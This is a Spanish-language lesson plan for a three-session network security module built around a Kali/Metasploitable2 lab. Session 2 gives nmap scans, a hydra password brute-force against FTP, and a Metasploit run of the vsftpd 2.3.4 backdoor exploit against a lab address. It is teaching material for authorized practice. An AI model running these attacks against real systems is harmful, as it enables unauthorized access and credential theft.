Módulo IV: Seguridad en Redes de Computadoras

Fundamentos y Prácticas Éticas (3 sesiones de 50 minutos)

⚠️ Consideraciones Éticas

Todas las prácticas deben realizarse exclusivamente en entornos autorizados. El acceso no autorizado a sistemas informáticos es ilegal.

Sesión 1: Fundamentos de Seguridad en Redes

Objetivos:

  • Comprender los principios básicos de seguridad en redes
  • Identificar amenazas comunes
  • Configurar un entorno de práctica seguro

Actividad 1.1: Amenazas Comunes en Redes

Duración: 20 minutos

Analizar los siguientes tipos de ataques:

Ataque Descripción Ejemplo
Man-in-the-Middle Interceptación de comunicación entre dos partes ARP spoofing
Denegación de Servicio Sobrecargar un sistema para que no esté disponible Ping flood
Explotación de servicios Aprovechar vulnerabilidades en servicios de red Ataque a FTP vulnerable

Actividad 1.2: Configuración de Entorno de Práctica

Duración: 30 minutos

# Instalar VirtualBox y descargar imágenes:
- Kali Linux
- Metasploitable2

# Configurar red en modo "Host-Only"

Sesión 2: Técnicas Básicas de Análisis

Objetivos:

  • Aprender técnicas de escaneo de red
  • Identificar servicios vulnerables
  • Realizar pruebas éticas básicas

Actividad 2.1: Escaneo de Red con Nmap

Duración: 25 minutos

$ sudo nmap -sn 192.168.56.0/24 # Descubrir hosts
$ sudo nmap -sV -sC 192.168.56.101 # Escanear servicios
$ sudo nmap --script vuln 192.168.56.101 # Buscar vulnerabilidades

Actividad 2.2: Prueba de Vulnerabilidad en FTP

Duración: 25 minutos

$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101
$ msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.101
msf6 > exploit

Sesión 3: Seguridad Práctica y Contramedidas

Objetivos:

  • Aplicar medidas de protección básicas
  • Analizar casos de estudio
  • Evaluar lo aprendido

Actividad 3.1: Hardening de Servicios

Duración: 20 minutos

Configurar medidas de protección:

# En Metasploitable2:
$ sudo apt update && sudo apt upgrade # Actualizar
$ sudo ufw enable # Activar firewall
$ sudo passwd root # Cambiar contraseña

Actividad 3.2: Análisis de Caso Práctico

Duración: 20 minutos

Analizar el ataque WannaCry y su propagación a través de redes:

  • Vector de ataque: EternalBlue
  • Propagación: SMB vulnerables
  • Contramedidas: Parches MS17-010

Actividad 3.3: Evaluación Rápida

Duración: 10 minutos

Responder:

  1. ¿Qué comando usarías para encontrar hosts activos en una red?
  2. Nombra dos medidas para proteger un servidor FTP
  3. ¿Por qué es importante el principio de mínimo privilegio?
